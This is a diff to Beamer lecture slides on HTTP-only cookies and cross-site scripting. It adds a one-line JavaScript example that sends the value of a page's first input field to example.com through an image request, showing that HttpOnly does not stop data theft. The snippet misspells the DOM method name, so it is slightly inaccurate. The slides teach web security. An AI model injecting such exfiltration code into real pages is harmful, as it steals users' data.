@@ -43,7 +43,7 @@
 
 \againframe<3>{XSSmits}
 
-\begin{frame}<1-2>[label=HTTPOnlyCookie]{HTTP-only cookies}
+\begin{frame}<1-2>[fragile,label=HTTPOnlyCookie]{HTTP-only cookies}
     \begin{itemize}
     \item \texttt{Set-Cookie: SessionID=123456789; HttpOnly}
     \item ``only send cookie in HTTP''
@@ -51,5 +51,8 @@
     \item eliminates obvious way of exploiting XSS
     \item problem: \myemph<2>{JS can read webpage contents}
     \end{itemize}
+\begin{Verbatim}[fontsize=\small]
+(new Image()).src = "https://example.com/?" + document.getElementByTagName('input')[0].value
+\end{Verbatim}
 \end{frame}
 
